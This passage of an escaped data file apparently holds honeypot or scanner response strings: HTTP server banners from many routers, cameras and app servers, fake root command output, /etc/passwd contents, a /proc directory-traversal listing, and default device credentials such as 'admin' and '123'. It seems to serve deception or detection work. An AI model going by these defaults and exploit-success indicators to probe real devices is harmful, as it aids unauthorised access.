Apr  8 2014\\nServer: JAWS/1.0 Aug 21 2013\\nServer: JAWS/1.0 Aug 26 2015\\nServer: JAWS/1.0 Mar  6 2017\\nServer: JAWS/1.0 Sep 18 2018\\nServer: JAWS/1.0 Sep 30 2016\\nServer: JFinal 4.9.17\\nServer: Java Composer Server 2.1\\nServer: Jetty(6.1.11)\\nServer: Jetty(6.1.14)\\nServer: Jetty(6.1.26)\\nServer: Jetty(6.1.26.hwx)\\nServer: Jetty(7.6.0.v20120127)\\nServer: Jetty(7.6.13.v20130916)\\nServer: Jetty(8.2.0.v20160908)\\nServer: Jetty(9.2.14.v20151106)\\nServer: Jetty(9.4.43.v20210629)\\nServer: Jetty(9.4.9.v20180320)\\nServer: Jetty(9.4.z-SNAPSHOT)\\nServer: Jetty(i-jetty 3.8)\\nServer: Jetty(winstone-2.8)\\nServer: Jetty(winstone-2.9)\\nServer: Jetty/3.1.8 (Windows 2000 5.0 x86)\\nServer: Jetty/5.1.10 (Windows Server 2008 R2/6.1 amd64 java/1.6.0_31\\nServer: Jetty/5.1.10 (Windows Server 2008/6.1 amd64 java/1.6.0_07\\nServer: Jexus/5.8.2.21 Linux\\nServer: KWS-1043N-Svr\\nServer: Keil-EWEB/2.0\\nServer: Keil-EWEB/2.1\\nServer: Kerio Connect 7.0.1\\nServer: Kerio Connect 8.3.1\\nServer: Kerio Connect 9.2.8 patch 1\\nServer: Kestrel\\nServer: LHS\\nServer: LINUX/2.4 UPnP/1.0 BRCM400/1.0\\nServer: LIVE555 Streaming Media v2020.04.24\\nServer: LOS HTTP Server 1.0\\nServer: Linux UPnP/1.0 Huawei-ATP-IGD\\nServer: Linux, HTTP/1.1, DIR-850L Ver 1.13\\nServer: Linux/2.6.30.9-cig-4, UPnP/1.0, Portable SDK for UPnP devices/1.6.18\\nServer: Linux/2.x UPnP/1.0 Avtech/1.0\\nServer: Linux/2.x.x, UPnP/1.0, pvConnect UPnP SDK/1.0, Twonky UPnP SDK/1.1\\nServer: LiteSpeed\\nServer: Lotus-Domino\\nServer: MAGI 1.0\\nServer: MQCache/2.1.0\\nServer: MS-MFC-321-1/1.1\\nServer: MS-MFC-HttpSvr/1.0\\nServer: MS-SDK-HttpServer/1.0\\nServer: MapbarServer\\nServer: Mathopd/1.5p6\\nServer: Mbedthis-Appweb/0.0.0\\nServer: Mbedthis-Appweb/2.4.2\\nServer: Medusa/1.12\\nServer: Mhz server\\nServer: Microsoft-Azure-Application-Gateway/v2\\nServer: Microsoft-HTTPAPI/2.0\\nServer: Microsoft-IIS/10.0\\nServer: Microsoft-IIS/5.1\\nServer: Microsoft-IIS/6.0\\nServer: Microsoft-IIS/7.0\\nServer: Microsoft-IIS/7.5\\nServer: Microsoft-IIS/8.0\\nServer: Microsoft-WinCE/6.00\\nServer: Mikrotik HttpProxy\\nServer: MinIO Console\\nServer: Mini web server 1.0 Skyworth corp 2017.\\nServer: Mini web server 1.0 ZTE corp 2005.\\nServer: Mini web server 1.0 ZXIC corp 2005.\\nServer: MiniServ/1.530\\nServer: MiniServ/1.610\\nServer: MiniServ/1.941\\nServer: MiniServ/1.970\\nServer: MobileSMARTS/5.2.46.14758 Microsoft-HTTPAPI/2.0\\nServer: MochiWeb/1.0 (Any of you quaids got a smint?)\\nServer: Mongoose/6.11\\nServer: Mongoose/6.6\\nServer: MoxaHttp/1.0\\nServer: NVR EXT SERVER\\nServer: NetBox Version 2.8 Build 4128\\nServer: Netwave IP Camera\\nServer: Network_Module/1.0 (RX-V581)\\nServer: Nexus/3.0.0-03 (OSS)\\nServer: Nexus/3.0.1-01 (OSS)\\nServer: Nexus/3.13.0-01 (OSS)\\nServer: Nexus/3.18.0-01 (OSS)\\nServer: Nexus/3.19.1-01 (OSS)\\nServer: Nexus/3.7.1-02 (OSS)\\nServer: Nexus/3.9.0-01 (OSS)\\nServer: Nginx\\nServer: Niagara Web Server/1.1\\nServer: Niagara Web Server/3.8.111\\nServer: OPNsense\\nServer: OS 1.0 UPnP/1.0 Realtek/V1.3\\nServer: Octopus Deploy/ Microsoft-HTTPAPI/2.0\\nServer: OpenCms/11.0.2\\nServer: Oracle XML DB/Oracle Database\\nServer: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production\\nServer: Oracle-Application-Server-11g\\nServer: Oracle-HTTP-Server-11g\\nServer: OrientDB Server v.2.2.22 (build fb2b7d321ea8a5a5b18a82237049804aace9e3de)\\nServer: OrientDB Server v.2.2.37 (build a7541e7ceeabf592dd9a7b2928b6c023cbc73193, branch 2.2.x)\\nServer: Output-Streamer/0.2\\nServer: P-660HW-T1 v3\\nServer: PDR-M800/1.0\\nServer: PLKWebServer\\nServer: PRAVIS/1.0\\nServer: PRTG\\nServer: PRTG/13.1.2.1462\\nServer: PRTG/19.4.52.3515\\nServer: PasteWSGIServer/0.5 Python/2.7.6\\nServer: Payara Micro #badassfish\\nServer: Payara Server  4.1.1.164 #badassfish\\nServer: Payara Server  5.2021.7 #badassfish\\nServer: Polycom SoundPoint IP Telephone HTTPd\\nServer: Prometheus\\nServer: Python/3.7 websockets/10.1\\nServer: Python/3.8 aiohttp/4.0.0a1\\nServer: Qualvision -HTTPServer\\nServer: RG/Device 10.x\\nServer: RGOS HTTP-Server/1.1\\nServer: RainLoop\\nServer: Rapid Logic/1.1\\nServer: ReeCam IP Camera\\nServer: RemObjects SDK for .NET HTTP Server/5.0\\nServer: Reposify\\nServer: Resin/3.0.19\\nServer: Resin/3.1.12\\nServer: Resin/3.1.6\\nServer: Resin/3.1.8\\nServer: Resin/4.0.36\\nServer: Resin/4.0.40\\nServer: Resin/4.0.58\\nServer: Roku/10.0.0 UPnP/1.0 Roku/10.0.0\\nServer: RomPager/4.07 UPnP/1.0\\nServer: RomPager/4.51 UPnP/1.0\\nServer: Router\\nServer: Router Webserver\\nServer: Ruijie Server\\nServer: Rumpus\\nServer: SDK 4.2.0.0 UPnP/1.0 MiniUPnPd/1.6\\nServer: SEPM\\nServer: SOYAL Technology WebServer 2.0\\nServer: SP-XML\\nServer: SRS/3.0.85(OuXuli)\\nServer: SRS/4.0.161(Leo)\\nServer: SRS/4.0.177(Leo)\\nServer: SRS/4.0.198(Leo)\\nServer: SRS/4.0.201(Leo)\\nServer: SRS/5.0.12(Leo)\\nServer: SY8033\\nServer: SY8045\\nServer: Safedog WAF\\nServer: Safedog/4.0.0\\nServer: Saia PCD2M5540/1.10.16\\nServer: Saia PCD3.M5340/1.16.69\\nServer: Sanoil Bayi Portal\\nServer: Sanoil Bayi Portal\"\\nServer: Satrack\\nServer: Seeyon-Server/1.0\\nServer: Server\\nServer: Server Version 11.0\\nServer: SimpleHTTP/0.6 Python/2.7.16\\nServer: SimpleHTTP/0.6 Python/3.5.3\\nServer: SimpleHTTPWithUpload/0.1 Python/2.7.5\\nServer: SinforHttpd/1.0\\nServer: SiteScope/9.0 04:38:55 2007-08-19 build 911\\nServer: Snorkel/02.03.00.04\\nServer: SonicWALL\\nServer: Splunkd\\nServer: Start HTTP-Server/1.1\\nServer: StreamSystem\\nServer: StreamSystem 4.0\\nServer: Streamer 21.10\\nServer: Sun GlassFish Enterprise Server v2.1\\nServer: SuperSign\\nServer: Switch\\nServer: TOS/1.12.1\\nServer: TOSHIBA TEC CORPORATION\\nServer: TP-LINK HTTPD/1.0\\nServer: TR069 client TCP connection request Server\\nServer: TRMB/1.2\\nServer: Tableau\\nServer: TeamSpeak Server 3.13.2\\nServer: Tengine\\nServer: Tengine/1.5.2\\nServer: Tengine/2.1.2\\nServer: Tengine/2.2.3\\nServer: Tengine/2.3.0\\nServer: Tengine/2.3.2\\nServer: Tengine/2.3.3\\nServer: TestApp-1.0.0\\nServer: Tieline\\nServer: Titan\\nServer: TopWebServer\\nServer: TornadoServer/4.4.3\\nServer: TornadoServer/5.0.2\\nServer: TornadoServer/5.1\\nServer: TornadoServer/6.0.3\\nServer: TornadoServer/6.1\\nServer: Transmission\\nServer: TwistedWeb/12.0.0\\nServer: TwistedWeb/12.1.0\\nServer: TwistedWeb/13.2.0\\nServer: TwistedWeb/14.0.0\\nServer: TwistedWeb/16.2.0\\nServer: TwistedWeb/17.9.0\\nServer: TwistedWeb/18.4.0\\nServer: TwistedWeb/19.7.0\\nServer: TwistedWeb/20.3.0\\nServer: TwistedWeb/8.2.0\\nServer: Unknown\\nServer: VA Web Server\\nServer: VDNServer/2017\\nServer: VIAWEB system/1.0.0 (http://www.viawebsystem.com.br)\\nServer: Varnish\\nServer: Virata-EmWeb/R6_0_1\\nServer: Virata-EmWeb/R6_2_1\\nServer: Virtual Web 0.9\\nServer: WCY_WEBServer/1.0\\nServer: WCY_WEBServer/2.0\\nServer: WEB SERVER\\nServer: WEB-ROUTER\\nServer: WMSServer/2.0.1.0\\nServer: WSGIServer/0.2 CPython/3.6.8\\nServer: WSGIServer/0.2 CPython/3.7.7\\nServer: WSGIServer/0.2 CPython/3.8.5\\nServer: WSGIServer/0.2 CPython/3.9.6\\nServer: WVS\\nServer: WWW Server/1.1\\nServer: Web Hosting by Dot Enterprise Co.,Ltd (http://www.de.co.th/)\\nServer: Web Server\\nServer: Web Server 1.1\\nServer: Web Server/2.1.0 PeerSec-MatrixSSL/3.1.3-OPEN\\nServer: Web Server/2.1.0 PeerSec-MatrixSSL/3.9.5-OPEN\\nServer: Web server\\nServer: WebServer\\nServer: WebServer(ipcamera)\\nServer: WebServer/1.0 UPnP/1.0\\nServer: WebServer/1.2.0\\nServer: WebServer/2.0\\nServer: WebServer2\\nServer: WebSocket++/0.7.0\\nServer: WebSockify Python/2.7.12\\nServer: WebSphere Application Server/6.1\\nServer: WebSphere Application Server/7.0\\nServer: Webio Embedded server v1.0\\nServer: Webs\\nServer: Werkzeug/0.10.4 Python/2.7.1\\nServer: Werkzeug/0.12.2 Python/3.6.2\\nServer: Werkzeug/0.14.1 Python/3.7.3\\nServer: Werkzeug/0.16.1 Python/3.8.10\\nServer: Werkzeug/0.8.3 Python/2.6.3\\nServer: Werkzeug/0.9.4 Python/2.7.6\\nServer: Werkzeug/1.0.1 Python/3.8.2\\nServer: Werkzeug/2.0.1 Python/3.6.9\\nServer: WildFly/10\\nServer: WildFly/8\\nServer: Wildfly 8\\nServer: WindRiver-WebServer/4.5\\nServer: WindRiver-WebServer/4.7\\nServer: Winstone Servlet Engine v1.0.5\\nServer: WintenDo\\nServer: X-Web\\nServer: X-web\\nServer: Xavante 2.2.0 embeded\\nServer: Xfinity Broadband Router Server\\nServer: ZK Web Server\\nServer: ZLMediaKit(git hash:1292ec6,branch:master,build time:Sep 29 2021 18:28:24)\\nServer: ZLMediaKit(git hash:b4207240,branch:master,build time:Nov  2 2021 11:36:02)\\nServer: ZLMediaKit-5.0(build in Apr  8 2021 03:17:35)\\nServer: ZTE web server 1.0 ZTE corp 2015.\\nServer: ZXVEVMC01\\nServer: adong\\nServer: aeserver\\nServer: airCube\\nServer: alphapd\\nServer: alphapd/2.1.8\\nServer: app07\\nServer: appnode/ccenter\\nServer: avtech/1.0\\nServer: awselb/2.0\\nServer: axhttpd/1.4.0\\nServer: axhttpd/1.5.3\\nServer: beegoServer:1.11.1\\nServer: beegoServer:1.12.0\\nServer: beegoServer:2.0.0\\nServer: bfe/1.0.8.18\\nServer: bks400\\nServer: boss/1.0 (BOSS)\\nServer: box\\nServer: cPanel\\nServer: cc-web/1.6.3\\nServer: cdn\\nServer: cisco-IOS\\nServer: cloudflare\\nServer: cloudflare-nginx\\nServer: convesio/2.1\\nServer: d45964bf-d48c-477c-8655-56bb369797b6\\nServer: d7b452-d70-1255-4515-9b56f13a6dab\\nServer: darkstat/3.0.718\\nServer: dcs-lig-httpd\\nServer: debut/1.30\\nServer: demce.tk\\nServer: e7fd6736-5b0f-4af1-54a0-c95a00f208b\\nServer: eWON\\nServer: fasthttp\\nServer: fibjs\\nServer: flowproxy\\nServer: gSOAP/2.7\\nServer: gSOAP/2.8\\nServer: gen5th/1.33.00\\nServer: gf-app\\nServer: gunicorn\\nServer: gunicorn/18.0\\nServer: gunicorn/19.4.5\\nServer: gunicorn/19.7.0\\nServer: gunicorn/19.8.1\\nServer: gunicorn/19.9.0\\nServer: gunicorn/20.0.4\\nServer: gunicorn/20.0.4\\t831\\nServer: h2o/2.3.0-DEV@1d12c355\\nServer: hidden\\nServer: hmhttpd/1.24-20160808\\nServer: hts_server\\nServer: http server 1.0\\nServer: httpd\\nServer: httpd 1.1\\nServer: httpd/2.0\\nServer: httpd_gargoyle/1.0 14mar2008\\nServer: huohuo\\nServer: iSpy\\nServer: iVMS-Web\\nServer: iis8.0\\nServer: infosec/1.0.0\\nServer: ioLogik Web Server/1.0\\nServer: jjhttpd v0.1.0\\nServer: kangle/3.5.19\\nServer: kangle/3.5.8.2\\nServer: kx-ns1000\\nServer: lighttpd\\nServer: lighttpd (SliTaz GNU/Linux)\\nServer: lighttpd/1.4.19\\nServer: lighttpd/1.4.25-devel-v2.2.24-45-gc66fb0e4\\nServer: lighttpd/1.4.26-devel-v14.07.2\\nServer: lighttpd/1.4.28-devel-10177\\nServer: lighttpd/1.4.28-devel-135:137M\\nServer: lighttpd/1.4.28-devel-171:172M\\nServer: lighttpd/1.4.28-devel-9217\\nServer: lighttpd/1.4.32\\nServer: lighttpd/1.4.32-devel-20015M\\nServer: lighttpd/1.4.37\\nServer: lighttpd/1.4.54\\nServer: lighttpd/1.4.55\\nServer: localhost\\nServer: lwIP/1.4.0 (http://savannah.nongnu.org/projects/lwip)\\nServer: mHttp 0.1.6296.32466\\nServer: mORMot (Windows) Microsoft-HTTPAPI/2.0\\nServer: mcdhttpd/1.2\\nServer: mginx\\nServer: micro_httpd\\nServer: mini_httpd\\nServer: mini_httpd/1.19 19dec2003\\nServer: mini_httpd/1.21 18oct2014\\nServer: mini_httpd/1.24 10May2016\\nServer: mini_httpd/1.27 07Mar2017\\nServer: mini_httpd/1.30 26Oct2018\\nServer: miniupnpd/1.0 UPnP/1.0\\nServer: mongo/2.0\\nServer: mxhttpd/2.19-MX Jun 16 2020\\nServer: nPerf/2.2.0 2019-04-02\\nServer: nPerf/2.2.6 2021-05-08\\nServer: netis/1.0.1\\nServer: nginx\\nServer: nginx-V-ddos\\nServer: nginx-more\\nServer: nginx-reuseport/1.13.4\\nServer: nginx-upupw/1.8.0\\nServer: nginx/0.7.64\\nServer: nginx/1.0.15\\nServer: nginx/1.10.1\\nServer: nginx/1.14.2\\nServer: nginx/1.19.1\\nServer: nginx/1.9.11\\nServer: nginx/1.9.9\\nServer: nhttpd/3.4.0 (yhttpd_core/1.3.2)\\nServer: nostromo 1.9.4\\nServer: nws/1.0\\nServer: nxahttp/2.1.7415.0\\nServer: o2switch-PowerBoost-v3\\nServer: oatpp/1.2.5\\nServer: openresty\\nServer: openresty/1.11.2.1\\nServer: openresty/1.11.2.5\\nServer: openresty/1.13.6.2\\nServer: openresty/1.15.8.1\\nServer: openresty/1.15.8.2\\nServer: openresty/1.15.8.3\\nServer: openresty/1.17.8.2\\nServer: openresty/1.19.3.1\\nServer: openresty/1.19.3.2\\nServer: openresty/1.19.9.1\\nServer: openresty/1.9.15.1\\nServer: openresty/1.9.3.1\\nServer: phpiis.com\\nServer: pve-api-daemon/3.0\\nServer: router webs\\nServer: secure\\nServer: shield\\nServer: squid\\nServer: squid/2.7.STABLE9\\nServer: squid/3.1.20\\nServer: squid/3.3.8\\nServer: squid/3.5.12\\nServer: squid/3.5.20\\nServer: squid/3.5.25\\nServer: squid/3.5.27\\nServer: squid/4.10\\nServer: squid/4.11\\nServer: squid/4.13\\nServer: squid/4.13-VCS\\nServer: squid/4.14\\nServer: sslvpn 1.0\\nServer: sthttpd/2.27.0 03oct2014\\nServer: streamserver\\nServer: success web server/1.0.0\\nServer: sundray\\nServer: sw-cp-server\\nServer: swoole-http-server\\nServer: t1-httpd/1.4.43\\nServer: thttpd\\nServer: thttpd/2.25b 29dec2003\\nServer: thttpd/2.25b-lxc 29dec2003\\nServer: thttpd/2.29 23May2018\\nServer: tinyproxy/1.8.3\\nServer: tr069 http server\\nServer: tsbox\\nServer: uc-httpd 1.0.0\\nServer: uc-httpd/1.0.0\\nServer: udpxy 1.0-23.10 (prod) standard [Linux 3.18.67 x86_64]\\nServer: uhttpd/1.0.0\\nServer: ulwsd/1.0.1-20140331\\nServer: vws 1.7.12\\nServer: w3httpd/1.0\\nServer: waitress\\nServer: web\\nServer: web server\\nServer: webfs/1.21\\nServer: webs/\\nServer: webserver\\nServer: webserver/0.0.0\\nServer: webserver/1.0\\nServer: websocket-sharp/1.0\\nServer: webswing.org\\nServer: wts/1.2\\nServer: xxxxxxxx-xxxxx\\nServer: yawcam/0.6.0\\nServer: yealink embed httpd\\nServer: yuntuc\\n\\n007b2000-007c1000 rw-p 00000000 00:00 0\\nSize:                 60 kB\\nRss:                  52 kB\\nPss:                  52 kB\\nShared_Clean:          0 kB\\nShared_Dirty:          0 kB\\nPrivate_Clean:         0 kB\\nPrivate_Dirty:        52 kB\\nReferenced:           52 kB\\nAnonymous:            52 kB\\nAnonHugePages:         0 kB\\nSwap:                  8 kB\\nKernelPageSize:        4 kB\\nMMUPageSize:           4 kB\\n009b1000-009b8000 rwxp 001b1000 fd:01 3339977                            /var/Sofia\\nSize:                 28 kB\\nRss:                   0 kB\\nPss:                   0 kB\\nShared_Clean:          0 kB\\nShared_Dirty:          0 kB\\nPrivate_Clean:         0 kB\\nPrivate_Dirty:         0 kB\\nReferenced:            0 kB\\nAnonymous:             0 kB\\nAnonHugePages:         0 kB\\nSwap:                  0 kB\\nKernelPageSize:        4 kB\\nMMUPageSize:           4 kB\\n\\n9061-2202-EVC\\nCVE-2022-1609\\nHardware:\"586\"\\n<pre>\\n/root\\nuid=13883(root) gid=13883(root) groups=13883(root)\\nuid=13883(rootxx) gid=13883(rootxx) groups=13883(rootxx)\\n62318aca2ef2e809a13623715a8aaff4\\n62318aca2ef2e809\\na13623715a8aaff4\\nmuie1976\\n</pre>\\n<name=\"waninf\"><option value=\"116.63.130.30\">\\n<web-app xmlns=\"s\" version=\"3.1\"> <display-name>Confluence</display-name> <description>Confluence Web App</description></web-app>\\nuid=0(root) gid=0(root) groups=0(root)\\n7fddea3c1c6b1bfc0a04e00c21bca04f\\nINVALID_VALUE does not correspond to an entity on this site\\nurn:Belkin:device:\\nkubernetes-master\\nHelloThinkPHP\\nVuln!! patch it Now!\\npoller_realtime.php\\nApiVersion\\nclient version 1.16\\nx_jenkins\\ndrupal\\nmodx\\ncouchdb\\n67616b6b692076312e30nami v1.0.1\\nThe Cross Web Server Access\\nAccess to this document requires a User ID\\nCGI process file does not exist\\nVPN Server could not parse request.\\nRouterOS v6.36.4\\nRouterOS v6.27\\n>HybridAuth 2.0.10 Installer<\\nInstallation completed\\nversion 0.80.0 Copyright\\nDasanNetwork Solution\\nUseUserCredential\\npassword\\nUser Password\\n0MLog\\nroot:\\nempty or is not available to view\\nWPAPSK\\npppoe_password\\nadmin \\'c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab\\'\\nadmin\\'c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab\\'\\nadmin:\\nlogin:\\npassword:\\nHello: World!\\nH0m3l4b1t: YES\\nvar XOntName = \"GPON Home Gateway\";\\ndiag_result = \"\";\\nDSL-2750B\\ncharset\\nVACRON\\nhttpd\\nSAMEORIGIN\\nWR841N\\nWR740N\\nLinksys\\nWAP300N\\nWAP610N\\nWES\\nWET\\nnetgear\\n_2netgear\\n_4tplink\\n_3dlink\\n_5RouterOS\\nEnGenius\\nHydra/0.1.8\\nchaset\\nCerio\\nNUUOA\\nMMcS\\nvar AYECOM_FWVER=\"1.03\";\\n<productName>FI9800P+V3</productName>\\n<firmwareVer>2.84.2.33</firmwareVer>\\n<hardwareVer>1.12.5.2</hardwareVer>\\npmaversion = \\'4.6.0\\';\\n\"token\" value=\"yJpdiI6IkZpeaasdf1sdfbs\"\\ntoken=yJpdiI6IkZpeaasdf1sdfbs$\\nWelcome to\\n\"Hello, Peppa!\"\\nvar user_passwd=\"YWRtaW4=\";\\nSUCCESS\\n: Linux, HTTP/1.1, DIR\\nCLASSID=\"CLSID:F59544C4-3439-46A7-B723-BE4DAB3FE768\"\\nCODEBASE=\"WebClientPro.cab#version=3,4,0,3\"\\n<param name=\"CmdPort\" value=\"5920\">\\n<param name=\"StreamPort\" value=\"5921\">\\n<Titan>03.08\\n<Titan>03.07\\n<H1>Index of /mnt/web/</H1>\\n<p><a href=\"//mnt/web/.\">.</a></p>\\n<p><a href=\"//mnt/web/..\">..</a></p\\n<p><a href=\"//mnt/web/../../proc/.\">.</a></p>\\n<p><a href=\"//mnt/web/../../proc/..\">..</a></p>\\n<p><a href=\"//mnt/web/../../proc/18881\">18881</a></p>\\n<p><a href=\"//mnt/web/../../proc/cmdline\">cmdline</a></p>\\n<p><a href=\"//mnt/web/../../proc/cpuinfo\">cpuinfo</a></p>\\n<p><a href=\"//mnt/web/../../proc/\">devices</a>devices</p>\\n<p><a href=\"//mnt/web/../../proc/\">version</a>version</p>\\n<script>document.localtion.replace(\"/+CSCOE+/logon.html\")</script>\\n///\\n[\\n        {\"name\":\"+CSCOE+\", \"size\":0, \"type\":\"1\", \"mdate\":1526562483}\\n        {\"name\":\"user:mbentk\", \"size\":0, \"type\":\"0\", \"mdate\":1526562483}\\n]\\n\\n<title>Redirecting to OrientDB Studio...</title>\\n<meta name=\"title\" content=\"Document | DBMS | Database | Java | Studio\" />\\n<meta name=\"description\" content=\"OrientDB Studio\" />\\nRedirecting to OrientDB Studio...\\n<center><h3>Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root)\\n<center><h3>Successful to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root)\\n<b><font size=\"+3\">SPECO WEB SETUP </font></b><font size=\"-2\">(ver 1.7.6m)</font><br><br><br><br><br>\\nbase64Binary</base64Binary>\\n<a href=\"http://mikrotik.com\"><img src=\"mikrotik_logo.png\" style=\"float: right;\" /></a>\\n<h1>RouterOS v6.27</h1>\\n<h1>RouterOS v6.36.4</h1>\\n<h1>(MikroTik 6.36.4)</h1>\\n<tr><td colspan=\"3\"><h2>WebFig Login:</h2>\\n<title>RouterOS router configuration page</title>\\nLinux Ubuntu 4.4.0-101-generic #124-Ubuntu SMP Fri Nov 10 18:29:59 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\\nLocation: http://192.168.1.1/home_H1.asp\\n<html ng-app=\"solrAdminApp\">\\n<title>Solr Admin</title>\\ndocument.write(\"<span><font color=\"#006699\" style=\"font-family:Arial;font-size:20px;\">Home Gateway</font></span>\");\\ndocument.write(\"<span><font color=\"#006699\" style=\"font-family:Arial;font-size:28px;\"><b>å®¶ åº\\xad ç½\\x91 å\\x85³</b></font></span>\");\\n<HTML><HEAD><script>top.location.href=\"/Main_Login.asp?error_status=1&page=index.asp&lock_time=0\";</script>\\n</HEAD></HTML>\\nAdmin:\\nMLog\\ndeadbeaf\\njava.lang.ProcessBuilder\\n[fonts]\\nConfigSystemCommand\\n<NewUserpassword>455</NewUserpassword>\\n :no\\nD-Link\\n<div id=\"menu\" class=\"topmenucontainer\" style=\"display:none;\"><div class=\"modelname\">DIR-629</div>\\n<div id=\"menu\" class=\"topmenucontainer\" style=\"display:none;\"><div class=\"modelname\">DIR-600</div>\\n<form name=\"frm\" id=\"frm\" method=\"post\" action=\"login.php\">\\n<form name=\"pagepost\" method=\"post\" action=\"/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST\" id=\"pagepost\">\\nP-660HN-T1A_IPv6\\n[error]0\\nZyXEL P-660HN-T1A\\nhome_wan.htm\\nInvalid credentials for user\\nBasic realm=\"DVR\"\\nBasic realm=\"Broadband Router\"\\n,/playzone,/\\nTOTOLINK\\nHTTP/1.1 200 Ok\\r\\nServer: micro_httpd\\nCOMPLETED\\n/themes/oem.css\\nRedirect\\n/syscmd.htm\\n{\"errCode\":0}\\nerrcode:5\\nsuccess\\npingHost.cmd\\nvalue=\"  OK  \"\\n<status>success</status>\\nloc += \\'&sessionKey=ffadbc1a2e34ff5ef\\';\\n}\\n\\nvar code = \\'location=\"\\' + loc + \\'\"\\';\\n\\nDeviceBasicInfo\\nUserSetSetting\\nDDNSSetting\\n<title>Network Video Recorder Login</title>\\nvar VENDOR_NAME = \"NUUO\";\\nvar VENDOR_DISPLAY_NAME = \"NUUO\";\\nvar DEFAULT_PASSWD = \"admin\";\\nvar COPYRIGHT_YEAR = \"2013\";\\nvar SUPPORT_SYSTEM_SETTING = true;\\nvar SUPPORT_RAID_SETTING = true;\\nvar SUPPORT_NETWORK_SETTING = true;\\nvar SUPPORT_POS = true;\\nvar SUPPORT_IO = true;\\nvar SUPPORT_WEB_SERVICE = true;\\nvar SUPPORT_HW_LOG = true;\\nvar SUPPORT_ABNORMAL_DISK_EVENT = true;\\nvar SUPPORT_DAILY_SYSTEM_REPORT = true;\\nvar SUPPORT_POWER_ON_EVENT = true;\\nvar SUPPORT_OVERHEAT_EVENT = true;\\nvar SUPPORT_LICENSE_TRANSFER = true;\\nvar SUPPORT_TRIAL = false;\\nvar SUPPORT_LOCAL_DISPAY = false;\\nvar NEED_UPLOAD_FROM_DISK = true;\\nvar SUPPORT_BUILDIN_DHCP = false;\\nvar OEM_TYPE = false;\\nvar DEFAULT_LANG = \"en\";\\nvar VENDOR_CONTACT_WINDOW = \"www.nuuo.com/eHelpdesk.php\";\\nvar PROJECT_NAME = \"NVRmini 2\";\\nvar PROJECT_SEN = \"85979a919b9a8c9796dfabb FF 2dfbddf939adf9b9098df939a\";\\nomg1337hax\\nRomPager\\ntomcat\\nphpmyadmin\\nlogin\\nddns\\nWPAPSK\\nAdm_ID\\nszUsername\\nszPassword\\nreport.db.server.name\\nreport.db.server.sa.pass\\nreport.db.server.user.pass\\npwdSupport\\npwdUser\\npwdAdmin\\nSTART\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nEND\\n~~~\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n~~~\\nFollow administrator instructions to enter the complete path\\nstatus=\"doing\"\\nCGISESSID\\nCommand was: show startup-config\\npwdAdmin = 123\\npwdSupport = 123\\npwdUser = admin\\nHello\\nNAME=\"OldPwd\"\\nlighttpd/1.4.34\\nWww-Authenticate: Basic realm=\"Panasonic network device\"\\nWWW-Authenticate: Basic realm=\"netcam\"\\nWWW-Authenticate: Basic realm=\"NETGEAR DGN1000 \"\\nWWW-Authenticate: Basic realm=\"iPEX Internet Cafe\"\\nWWW-Authenticate: Digest realm=\"IgdAuthentication\", domain=\"/\", nonce=\"N2UyNjgxMjA6NjQ1MWZiOTA6IDJlNjI5NDA=\", qop=\"auth\", algorithm=MD5\\nWWW-Authenticate: Digest realm=\"GoAhead\", domain=\":81\",qop=\"auth\", nonce=\"405448722b302b85aa6ef2b444ea6b5c\", opaque=\"5ccc069c403ebaf9f0171e9517f40e41\",algorithm=\"MD5\", stale=\"FALSE\"\\nWWW-Authenticate: Basic realm=\"HomeHub\"\\nWWW-Authenticate: Basic realm=\"MOBOTIX Camera User\"\\nWWW-Authenticate: Basic aHR0cHdhdGNoOmY=\\nWWW-Authenticate: Basic realm=\"Tomcat Manager Application\"\\nWWW-Authenticate: Basic realm=\"Broadband Router\"\\nWWW-Authenticate: Basic realm=\"System\"\\nWWW-Authenticate: Basic realm=\"Server Status\"\\nHostname: HACKED-ROUTER-HELP-SOS-DEFAULT-PASSWORD\\nDreambox\\nSSID\\nPassPhrase\\n<ModelName>WRT110</ModelName>\\nUpdate Success!\\nNETGEAR R7000\\nNETGEAR R6400\\nnuuo123456\\n610cker\\nWAG\\ndgn123456\\nength: 11\\njaws123456\\nJAWS/\\nStruts2045\\nls3k\\nvar cmdResult = new Array(\\n\"asjhj\",\\n0,0 );\\nwrite = system,call,log,verbose,command,agent,user,originate\\nLinux node01 2.6.32-220.7.1.el6.x86_64 #1 SMP Wed Mar 7 00:52:02 GMT 2012 x86_64 GNU/Linux\\n<body class=\"ns_login_body\">\\n<span>User Name</span>\\n<label for=\"username\" style=\"display: none;\">User Name</label>\\n<input type=\"text\" id=\"username\" name=\"username\" class=\"login_input\" onfocus=1>\\n<div class=\"ns_grid_text login_password\">\\n<span>Password</span>\\n<label for=\"password\" style=\"display: none;\">Password</label>\\n<input type=\"password\" name=\"password\" id=\"password\" class=\"login_input\">\\n<label for=\"eula-accepted\" style=\"display: none;\">EULA</label>\\n<input type=\"checkbox\" name=\"eula\" id=\"eula-accepted\" value=\"TRUE\">\\n<label for=\"url\" style=\"display: 